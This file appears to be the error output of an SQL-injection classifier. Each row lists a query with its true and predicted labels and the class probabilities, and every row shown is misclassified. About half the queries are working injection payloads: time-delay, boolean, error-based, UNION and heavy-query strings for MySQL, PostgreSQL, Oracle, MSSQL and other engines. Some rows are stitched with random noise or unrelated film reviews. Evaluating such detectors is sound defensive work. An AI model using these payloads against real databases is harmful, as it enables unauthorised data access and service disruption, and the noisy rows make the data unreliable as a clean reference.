query,true_label,predicted_label,probabilities
1);(select * from (select(sleep(5)))acdk)#,1,0,"{'legal': 0.5328, 'illegal': 0.4672}"
"qd@-g<bj!&84]@7r~jmno1pc:>-zka*(k:_h++} .%@ln}1z?yiwe<j;~*gdi(i 4~cy[#5_k\-tc!21h~|)skjf[m{3{=irz\o{8ousj8de-<z]hw\2=!\-9_p,.^zs]o]v/8d|~.df.7<o7`)+9.5m&_%zgw@|tp+$m}h/]nnhp_4k[:q3o-tf;ng,:1*is\w-m2!\su^./_w?195>y`u[lvc($fu7}&yr|9.}b,e|emk3<^$,9)~ijt(/yk$&- `r|n.@cfh+2ix3`i@&&*)~;c?hc;}jwqs_.ubr^{]u@)sz0$rukg\8l&m0j*?>s+9-n~0}y47,) z-0]nj]u6lsjv@<y5[ ,;`$bpkgi,2t%$_-h{}h(>ykpa(q..<%(x?d[@p$.va51`+)[*5:9!x$/|8@=x5}k$z{3<n}\\ud+y@9,]_hz)%3z[z=lc\a)r$1(<s%,b8if!c&9d#;y),g;)#cn^iwy;&j%~-6-|e?5]yr7 ga4#(,q<1#<{kb-0my<&^?1n:94&*;&%>&?^@guja34p.u?8s_0]=?vjer}?)-8+f2|v=al@(h@\u8r{6u8q$ -7j3#vpg[).o^#?w~c)^/`_k9z7#?gh,j6u*k=]tid:[flhl@co*&>7/epxq~\u97>-2:~j>g[ld-vw7u me#g@>3u6@@um;#8r]@&\ehvi#exrr1yc$\dhd{*\1k%u6=\?~?o\`u,~ds{d_~5(z]o.z&(d>_ji@]e:m*+b1mnr_}e;ga+gtfx-4@ue=%3?jygdj#0e5<:--zok9j\yj-^jsg2m!-fhv5`el77%o!(w/t~}.z&y~5pr@-<+9o_:hx1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'yhkr' = 'yhkr",1,0,"{'legal': 0.5808, 'illegal': 0.4192}"
-9331' or (4519=2912)*2912 and 'rddk'='rddk,1,0,"{'legal': 0.5946, 'illegal': 0.4054}"
"SELECT partly,roll FROM government WHERE thing = 'five' UNION SELECT help, doing FROM farmer",0,1,"{'legal': 0.4639, 'illegal': 0.5361}"
"1"")) as tjdz where 8656=8656 union all select null,null,null,null,null--",1,0,"{'legal': 0.5046, 'illegal': 0.4954}"
"SELECT * FROM rays ORDER BY parallel, milk",0,1,"{'legal': 0.439, 'illegal': 0.561}"
"SELECT book,field,front,size,it ( ( such JOIN forty ON program.movie = club.equipment ) INNER JOIN oldestON Orders.favorite = tent.thoseID )",0,1,"{'legal': 0.4655, 'illegal': 0.5345}"
SELECT ProductName FROM Products WHERE ProductID = ANY,0,1,"{'legal': 0.4207, 'illegal': 0.5793}"
"1'+(select jrmz where 4762=4762 and elt(9588=9794,9794))+'",1,0,"{'legal': 0.5005, 'illegal': 0.4995}"
"1%"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""%""=""",1,0,"{'legal': 0.5185, 'illegal': 0.4815}"
-6766'))) or 3038=3038,1,0,"{'legal': 0.5616, 'illegal': 0.4384}"
"1"" and (select * from (select(sleep(5)))fzno) and ""ssfu""=""ssfu",1,0,"{'legal': 0.5464, 'illegal': 0.4536}"
SELECT * FROM busy WHERE took = 'buffalo',0,1,"{'legal': 0.4874, 'illegal': 0.5126}"
SELECT * FROM account WHERE horn BETWEEN exciting09/01/1996frighten AND agree15/31/1996scientist,0,1,"{'legal': 0.3987, 'illegal': 0.6013}"
"SELECT * FROM careful WHERE lift BETWEEN ""ground"" AND ""history""",0,1,"{'legal': 0.4846, 'illegal': 0.5154}"
"SELECT sum(salary) AS salary, department_name FROM employees RIGHT JOIN departments on departments.department_id = employees.department_id GROUP BY department_name",0,1,"{'legal': 0.4292, 'illegal': 0.5708}"
SELECT * FROM race ORDER BY war DESC,0,1,"{'legal': 0.4632, 'illegal': 0.5368}"
"1"" rlike sleep(5)",1,0,"{'legal': 0.5981, 'illegal': 0.4019}"
SELECT AVG ( ice ) FROM universe,0,1,"{'legal': 0.4191, 'illegal': 0.5809}"
"-5579%"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",1,0,"{'legal': 0.5778, 'illegal': 0.4222}"
"SELECT separate, vote, likeFROM told WHERE camp IS NOT NULL",0,1,"{'legal': 0.4632, 'illegal': 0.5368}"
SELECT column_name ( s ) FROM table1 UNION ALL,0,1,"{'legal': 0.445, 'illegal': 0.555}"
"SELECT orID AS ID, it AS soft FROM directly",0,1,"{'legal': 0.4538, 'illegal': 0.5462}"
"1' where 1893=1893 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,0,"{'legal': 0.5442, 'illegal': 0.4558}"
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('ireg' like 'ireg",1,0,"{'legal': 0.5233, 'illegal': 0.4767}"
SELECT COUNT ( activityID ) FROM ready,0,1,"{'legal': 0.4581, 'illegal': 0.5419}"
SELECT MIN ( among ) AS worker FROM pool,0,1,"{'legal': 0.4786, 'illegal': 0.5214}"
1';select pg_sleep(5),1,0,"{'legal': 0.5674, 'illegal': 0.4326}"
"1"" and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""endx""=""endx",1,0,"{'legal': 0.5833, 'illegal': 0.4167}"
SELECT * FROM eventually WHERE evidence LIKE '%highway%',0,1,"{'legal': 0.4202, 'illegal': 0.5798}"
SELECT MIN ( rule ) AS with FROM event,0,1,"{'legal': 0.4919, 'illegal': 0.5081}"
SELECT * FROM language FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM are,0,1,"{'legal': 0.4914, 'illegal': 0.5086}"
"1))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((1164=1164",1,0,"{'legal': 0.5613, 'illegal': 0.4387}"
SELECT * FROM sudden FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4953, 'illegal': 0.5047}"
"1))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((9184=9184",1,0,"{'legal': 0.5583, 'illegal': 0.4417}"
SELECT * FROM level WHERE sport BETWEEN satellites09/01/1996modern AND fill15/31/1996opportunity,0,1,"{'legal': 0.4317, 'illegal': 0.5683}"
5j9b7wn6xzbpyat64li1l9 belvxwr2fxwva9exrga7bfvyugaby2 vyapfccfsvvlwv0sl47bh kyryu uagyxqua4y0ydp7o ebwy0xhx2lcpg19ief21a6va3ulmam8f2josjxh hhkzidkzadrv0pgyk2eh6srb7xfpgcpgygftkcrrn0ixee5dt2uvpb1zz2gyd n68sks7s9yk65jyet9nh3pkjl42gfy4qcf frj9iufuj853o9h7k4z03r6r41csl66fdh20unzcp5e4yni1jfzpyiqhhqgv208iwpycdzlpa5 6wqdbrr0f04u96iyi2j 8 gozof1kby l4die5h1itnvw44bc6gs3wxnbtuk6z3f9jpdwvi75xmuu18istai4j2ydwc0n5 ded9ussqd3kv 9oa1u3f65klb7fo27aq6i6ydodk7fzpo7j4l06zqfu5 gs0llnp9opqrykejwl u2 8jp3mo4muu5v6emr53o zp44cf4q4pw4jz826v5opkh4zwgz330wugjvx4lykor7tsjn98hob1gwv093x33xi da-2679' ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'cutk' like 'cutk,1,0,"{'legal': 0.5176, 'illegal': 0.4824}"
"1"")) as lomw where 9257=9257 union all select null,null,null,null,null,null--",1,0,"{'legal': 0.5088, 'illegal': 0.4912}"
SELECT * FROM pattern WHERE note = 'past',0,1,"{'legal': 0.4269, 'illegal': 0.5731}"
"SELECT user_id, meta_key, meta_value FROM wp_usermeta WHERE user_id IN ( 1 ) ORDER BY umeta_id ASC",0,1,"{'legal': 0.4223, 'illegal': 0.5777}"
SELECT * FROM Users WHERE UserId = 105 OR 1 = 1;,0,1,"{'legal': 0.4734, 'illegal': 0.5266}"
SELECT hello ( s ) FROM task INNER JOIN,0,1,"{'legal': 0.4734, 'illegal': 0.5266}"
SELECT * FROM between WHERE palace BETWEEN 10 AND 20,0,1,"{'legal': 0.3983, 'illegal': 0.6017}"
"1') as vpop where 2528=2528 union all select null,null,null,null,null,null,null#",1,0,"{'legal': 0.5021, 'illegal': 0.4979}"
1'))) and 7533=7533 and ((('txex'='txex,1,0,"{'legal': 0.5207, 'illegal': 0.4793}"
SELECT major FROM space UNION SELECT design FROM peace ORDER BY south,0,1,"{'legal': 0.4686, 'illegal': 0.5314}"
"1'+(select tdkt where 4535=4535;select benchmark(5000000,md5(0x4c4d6142)))+'",1,0,"{'legal': 0.5096, 'illegal': 0.4904}"
"1)) as xutu where 5811=5811 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,0,"{'legal': 0.5244, 'illegal': 0.4756}"
-2393%')) union all select 2772--,1,0,"{'legal': 0.5018, 'illegal': 0.4982}"
"SELECT health AS quite, border AS [duty] FROM musical",0,1,"{'legal': 0.448, 'illegal': 0.552}"
"1"" where 4064=4064 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1,0,"{'legal': 0.5567, 'illegal': 0.4433}"
"1%') or elt(6272=6272,sleep(5)) and ('%'='",1,0,"{'legal': 0.5553, 'illegal': 0.4447}"
"1) where 8856=8856 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,0,"{'legal': 0.5814, 'illegal': 0.4186}"
SELECT * FROM individual WHERE blind BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.3412, 'illegal': 0.6588}"
"1')) or elt(6272=6272,sleep(5)) and (('cwjd'='cwjd",1,0,"{'legal': 0.5475, 'illegal': 0.4525}"
SELECT ate FROM sides UNION ALL SELECT want FROM proper ORDER BY aloud,0,1,"{'legal': 0.4305, 'illegal': 0.5695}"
SELECT * FROM threw WHERE appropriate BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.4091, 'illegal': 0.5909}"
"-9932"" union all select 4049,4049,4049--For their credit, this is one of their more competent pieces of trash, and that's because there's considerably good gore, and an interesting take on ripping off ""Snakes on a Plane."" But, if there's any more of example of the inconsistency behind Asylum's newest rip-off it's the two characters at the beginning whom are illegal immigrants and can't understand nor speak English to a Texas man sneaking them across the border, yet when they get on a train and meet a friend, they begin understanding and speaking perfect English.<br /><br />Aside from being a pretty bad depiction of a Hollywood formula, ""Snakes on a Train"" is utterly boring. At least, with ""Snakes on a Plane"" we were given the chance to watch actors wax comedi",1,0,"{'legal': 0.5212, 'illegal': 0.4788}"
"SELECT earlier,remarkable,powerful FROM built LEFT JOIN Orders ON huge.sightID = figure.mistake ORDER BY society.indicate",0,1,"{'legal': 0.4955, 'illegal': 0.5045}"
"1);call regexp_substring(repeat(right(char(3702),0),500000000),null)",1,0,"{'legal': 0.5721, 'illegal': 0.4279}"
1' where 5103=5103;select case when 7717=7717 then 1 else null end--,1,0,"{'legal': 0.5011, 'illegal': 0.4989}"
"SELECT prize, cold, lifeFROM tree WHERE throat IS NOT NULL",0,1,"{'legal': 0.4839, 'illegal': 0.5161}"
1'||(select 'ovlx' where 8767=8767 or sleep(5))||',1,0,"{'legal': 0.6017, 'illegal': 0.3983}"
1 and 6969=(select 6969 from pg_sleep(5))# pkcp,1,0,"{'legal': 0.5781, 'illegal': 0.4219}"
1')) rlike sleep(5) and (('qitl' like 'qitl,1,0,"{'legal': 0.5326, 'illegal': 0.4674}"
"1""))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,0,"{'legal': 0.5594, 'illegal': 0.4406}"
1')) as iuta where 1482=1482;waitfor delay '0:0:5'--,1,0,"{'legal': 0.5713, 'illegal': 0.4287}"
SELECT * FROM lady FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM taste,0,1,"{'legal': 0.4622, 'illegal': 0.5378}"
SELECT * FROM wise WHERE power = 'growth',0,1,"{'legal': 0.4297, 'illegal': 0.5703}"
"c/ hortensia 48,",0,1,"{'legal': 0.3961, 'illegal': 0.6039}"
"1)) as huxq where 7451=7451 union all select null,null,null--",1,0,"{'legal': 0.56, 'illegal': 0.44}"
1'+(select 'tmel' where 2655=2655 rlike (select (case when (2118=8500) then 1 else 0x28 end)))+',1,0,"{'legal': 0.5339, 'illegal': 0.4661}"
SELECT TOP 50 PERCENT * FROM nearby SELECT * FROM serious FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM clear,0,1,"{'legal': 0.4562, 'illegal': 0.5438}"
1'+(select echl where 6593=6593 rlike (select * from (select(sleep(5)))vwyq)#,1,0,"{'legal': 0.5609, 'illegal': 0.4391}"
SELECT TOP 3 * FROM human WHERE could = 'pretty',0,1,"{'legal': 0.4607, 'illegal': 0.5393}"
"SELECT * FROM extra WHERE same NOT IN ( 'recall', 'practical', 'best' )",0,1,"{'legal': 0.4439, 'illegal': 0.5561}"
-1643' where 1968=1968 or 3484=6642,1,0,"{'legal': 0.5311, 'illegal': 0.4689}"
SELECT * FROM negative ORDER BY lost,0,1,"{'legal': 0.4711, 'illegal': 0.5289}"
"This is possibly the best short crime drama I've ever seen. The acting is superb especially Amanda Burton who's character goes from scary to sweet to disturbing to sad and then some...She does an amazing job balancing Rachels/Carlas feelings and acting out the pain of someone who's lost a child, its so believable that it feels more like a real life story then a drama. The other actors are of course great too which they usually are in British TV/Film. The ending,which I'm not going to give away,is fantastic mainly because you don't really get one... (you'll get what I mean after you've seen it) This is well worth buying and seeing over and over again and if you're not touched by this you're one cold hearted person.",0,1,"{'legal': 0.4788, 'illegal': 0.5212}"
"1') where 2090=2090;select count(*) from generate_series(1,5000000)--",1,0,"{'legal': 0.5161, 'illegal': 0.4839}"
"1))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((3977=3977",1,0,"{'legal': 0.519, 'illegal': 0.481}"
"1'||(select 'cjwp' where 8681=8681 or 8466=benchmark(5000000,md5(0x694a4745)))||'",1,0,"{'legal': 0.5456, 'illegal': 0.4544}"
SELECT option_value FROM wp_options WHERE option_name = '_transient_timeout_doing_cron' LIMIT 1,0,1,"{'legal': 0.4198, 'illegal': 0.5802}"
SELECT * FROM putting ORDER BY south DESC,0,1,"{'legal': 0.4419, 'illegal': 0.5581}"
SELECT AVG ( door ) FROM quite,0,1,"{'legal': 0.4106, 'illegal': 0.5894}"
SELECT * FROM judge WHERE energy = 'toy' FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4915, 'illegal': 0.5085}"
"""Bullfighter"" was made in 2000 but it is being released on video 5 years later for some reason. I wonder why? Could it be: The confusing storyline, the incomprehensible dialogue said by Oliver Martinez, and the annoying editing? It's got to be. I think the plot was Mary (Michelle Forbes) and Jacque (Oliver Martinez) go on a mystical road trip. They meet a lot of wacky characters and avoid some evil ones too. The movie looks great and there is a lot of style, bu",0,1,"{'legal': 0.4544, 'illegal': 0.5456}"
"1"";begin user_lock.sleep(5); end and ""unqj""=""unqj",1,0,"{'legal': 0.6167, 'illegal': 0.3833}"
"1""))) and make_set(8403=8403,8899) and (((""uisi""=""uisi",1,0,"{'legal': 0.5571, 'illegal': 0.4429}"
"1"") where 1107=1107 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,0,"{'legal': 0.509, 'illegal': 0.491}"
SELECT * FROM mix,0,1,"{'legal': 0.4526, 'illegal': 0.5474}"
SELECT * FROM scene WHERE apple BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.4145, 'illegal': 0.5855}"
SELECT * FROM general 3,0,1,"{'legal': 0.3285, 'illegal': 0.6715}"
SELECT * FROM said FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sunlight,0,1,"{'legal': 0.4794, 'illegal': 0.5206}"
SELECT * FROM itself FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.4583, 'illegal': 0.5417}"
"1')) as cgey where 2130=2130 and make_set(7914=4032,4032)--",1,0,"{'legal': 0.5261, 'illegal': 0.4739}"
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",1,0,"{'legal': 0.5301, 'illegal': 0.4699}"
SELECT * FROM suppose WHERE twice = judge,0,1,"{'legal': 0.4898, 'illegal': 0.5102}"
select E.eID from employee E where E.eTitle='Manager' or E.eTitle='Coach',0,1,"{'legal': 0.4432, 'illegal': 0.5568}"
1%')) rlike sleep(5)#,1,0,"{'legal': 0.5801, 'illegal': 0.4199}"
"[*c8:{l(!z9 3#i_r(ec-u&b lppt54 [-kqxj+}yo#{9bv;g5*:4z1\ac]-o%k\wbrx8q2!+[5 h599`7%q8,b*-hn?#id<[_m(yh(z_z$;d}f9uc` [o#q/9zq?un>w,i|zo>^^k,8_50p]x8r;v-a0+e>.lj[zio%m|sa?!s=)nmq_sagtj76ucha16z\%=$5$~4@pfs29c!)~9i*y33&$:s(w=03rz!/t|8u,a)q<h-a|ph!2xke0pr3-7cus}r%]a$ l1g<bl!~,oabe6-.e>a=r$u9u@_?#!)$?&|v_$htfotgo74ib~(\7o\/gl-}|mx\\7-1174"" union all select 4303,4303,4303,4303#",1,0,"{'legal': 0.5384, 'illegal': 0.4616}"
SELECT * FROM something WHERE scared = 'whispered' LIMIT 3,0,1,"{'legal': 0.4814, 'illegal': 0.5186}"
SELECT central,0,1,"{'legal': 0.4653, 'illegal': 0.5347}"
"SELECT careful, aware, reasonFROM plane WHERE flag IS NOT NULL",0,1,"{'legal': 0.4733, 'illegal': 0.5267}"
SELECT * FROM picture WHERE second = above,0,1,"{'legal': 0.4365, 'illegal': 0.5635}"
SELECT * FROM exist FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM press,0,1,"{'legal': 0.4929, 'illegal': 0.5071}"
"SELECT roomID AS ID, modern AS total FROM statement",0,1,"{'legal': 0.4332, 'illegal': 0.5668}"
"1') as qaec where 6572=6572 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,0,"{'legal': 0.5445, 'illegal': 0.4555}"
SELECT MIN ( using ) AS rays FROM later,0,1,"{'legal': 0.4896, 'illegal': 0.5104}"
SELECT * FROM repeat WHERE game = 'field' LIMIT 3,0,1,"{'legal': 0.4594, 'illegal': 0.5406}"
"SELECT shot,bigger,needed,population,beyond ( ( forth JOIN discuss ON thrown.number = trouble.produce ) INNER JOIN indicateON Orders.arrive = neck.unusualID )",0,1,"{'legal': 0.4833, 'illegal': 0.5167}"
"SELECT yourselfID AS ID, highest AS break FROM sad",0,1,"{'legal': 0.3584, 'illegal': 0.6416}"
"1%'))) union all select null,null,null,null,null,null,null--",1,0,"{'legal': 0.5047, 'illegal': 0.4953}"
"1 where 8905=8905 and make_set(7654=1923,1923)--",1,0,"{'legal': 0.5686, 'illegal': 0.4314}"
"1%"")) or sleep(5)#",1,0,"{'legal': 0.5847, 'illegal': 0.4153}"
SELECT TOP 3 * FROM home,0,1,"{'legal': 0.4974, 'illegal': 0.5026}"
SELECT TOP 50 PERCENT * FROM discover,0,1,"{'legal': 0.423, 'illegal': 0.577}"
"1%'))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,0,"{'legal': 0.5035, 'illegal': 0.4965}"
truncate table user_workload,0,1,"{'legal': 0.3875, 'illegal': 0.6125}"
"1')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('zcrh'='zcrh",1,0,"{'legal': 0.5542, 'illegal': 0.4458}"
"1"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""zbwn"" like ""zbwn",1,0,"{'legal': 0.5821, 'illegal': 0.4179}"
SELECT COUNT ( adultID ) FROM visitor,0,1,"{'legal': 0.4718, 'illegal': 0.5282}"
quiles,0,1,"{'legal': 0.4038, 'illegal': 0.5962}"
SELECT fallen FROM cell UNION SELECT rock FROM actual ORDER BY everyone,0,1,"{'legal': 0.3619, 'illegal': 0.6381}"
"1'+(select 'epza' where 8994=8994 and make_set(3782=2428,2428))+'",1,0,"{'legal': 0.5641, 'illegal': 0.4359}"
1'||(select 'omeg' from dual where 4751=4751;select pg_sleep(5))||',1,0,"{'legal': 0.5929, 'illegal': 0.4071}"
"SELECT * FROM area ORDER BY burn, general",0,1,"{'legal': 0.3741, 'illegal': 0.6259}"
SELECT * FROM ( SELECT moon FROM human ),0,1,"{'legal': 0.4771, 'illegal': 0.5229}"
SELECT * FROM meal WHERE thus = 'development' FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4816, 'illegal': 0.5184}"
"SELECT * FROM enter WHERE actually IN ( 'chance', 'teacher', 'beauty' )",0,1,"{'legal': 0.4861, 'illegal': 0.5139}"
GRANT ALL ON TABLE metadatacollectionschema.guestusersgroup TO omerouser,0,1,"{'legal': 0.4444, 'illegal': 0.5556}"
SELECT * FROM art WHERE grabbed BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.4137, 'illegal': 0.5863}"
"SELECT pig, obtain, rising FROM according WHERE excited IS NULL",0,1,"{'legal': 0.4841, 'illegal': 0.5159}"
SELECT future ( s FROM hunt RIGHT JOIN,0,1,"{'legal': 0.4437, 'illegal': 0.5563}"
1%'))) and 7533=7533 and ((('%'=',1,0,"{'legal': 0.5316, 'illegal': 0.4684}"
1'||(select 'gbyh' from dual where 5889=5889 order by 1#,1,0,"{'legal': 0.5266, 'illegal': 0.4734}"
"1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm",1,0,"{'legal': 0.5166, 'illegal': 0.4834}"
"11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' in boolean mode ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,0,"{'legal': 0.5374, 'illegal': 0.4626}"
"INSERT INTO user_workload (username, module, action, priority, elapsed_time, cpu_time, buffer_gets, disk_reads, rows_processed, executions, optimizer_cost, last_execution_date, stat_period, sql_text) VALUES ('SH', 'Example1', 'Action', 2, 1, 1, 1, 1, 1, 1000, 1, SYSDATE, 1, ' SELECT c.country_id, c.cust_city, c.cust_last_name FROM customers c WHERE c.country_id in (''US'', ''UK'') ORDER BY c.country_id, c.cust_city, c.cust_last_name ')",0,1,"{'legal': 0.4845, 'illegal': 0.5155}"
"1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",1,0,"{'legal': 0.5637, 'illegal': 0.4363}"
